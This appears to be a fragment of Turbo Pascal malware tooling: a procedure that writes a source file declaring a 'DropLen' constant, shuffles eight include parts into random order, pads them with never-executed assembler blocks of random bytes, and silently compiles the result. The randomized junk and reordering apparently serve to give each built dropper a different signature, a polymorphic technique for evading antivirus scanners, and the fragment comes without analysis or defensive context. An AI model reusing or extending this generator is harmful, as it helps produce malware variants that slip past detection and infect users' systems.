   procedure MakePas;
   const nic=8;
   var t:text;
       a,i,j,k,l:byte;
       m:array[1..nic] of byte;
       st:string;
       f:text;
   label lab;
   begin
   assign(t,'sf.pas');rewrite(t);
   writeln(t,'uses dos;');
   writeln(t,'const DropLen=',DropLen,';');
   writeln(t,'var Fake:boolean;');
   for i:=1 to nic do m[i]:=0;
   writeln(t,'{$I s0.inc}');
   for i:=1 to nic do
     begin
   lab:
     a:=random(nic)+1;
     if m[a]=0 then
       begin
       m[a]:=1;
       for j:=1 to random(3)+1 do
         begin
         inc(Dummy);
         str(Dummy+10,st);
         assign(f,'s'+st+'.inc');
         rewrite(f);
         writeln(f,'procedure s'+st+';assembler;');
         writeln(f,'asm');
         writeln(f,'jmp @');
         for k:=1 to random(10)+1 do
           begin
           write(f,'db ');
           for l:=1 to random(20)+1 do write(f,random(256),',');
           writeln(f,random(256));
           end;
         writeln(f,'@:');
         writeln(f,'end;');
         close(f);
         writeln(t,'{$I s',Dummy+10,'.inc}');
         end;
       end
     else goto lab;
     writeln(t,'{$I s',a,'.inc}');
     end;
   writeln(t,'begin');
   writeln(t,'Start;');
   writeln(t,'Fake:=false;');
   writeln(t,'if Fake then');
   writeln(t,'  begin');
   for i:=1 to Dummy do writeln(t,'  s',i+10,';');
   writeln(t,'  end;');
   writeln(t,'end.');
   close(t);
   exec(Command,'/c '+Compile+' sf.pas>nul');
   Dummy:=0;
   end;
